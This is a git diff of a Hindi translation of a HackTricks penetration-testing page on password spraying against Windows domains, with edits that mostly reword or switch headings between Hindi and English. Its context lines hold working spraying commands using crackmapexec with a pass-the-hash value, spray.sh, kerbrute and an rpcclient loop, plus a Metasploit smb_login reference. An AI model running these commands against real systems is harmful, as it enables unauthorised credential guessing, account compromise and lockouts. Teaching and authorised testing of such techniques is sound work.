@@ -49,7 +49,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Linux से शोषण (या सभी)
+### Linux (या सभी) से शोषण
 
 * **crackmapexec** का उपयोग करते हुए:
 ```bash
@@ -69,16 +69,16 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - अनुशंसित नहीं है कभी-कभी काम नहीं करता
+* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग करना - अनुशंसित नहीं है कभी-कभी काम नहीं करता
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* `scanner/smb/smb_login` मॉड्यूल के साथ **Metasploit**:
+* With the `scanner/smb/smb_login` module of **Metasploit**:
 
 ![](<../../.gitbook/assets/image (745).png>)
 
-* **rpcclient** का उपयोग करते हुए:
+* Using **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -163,7 +163,7 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें फॉलो करें।**
+* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**
 
 </details>
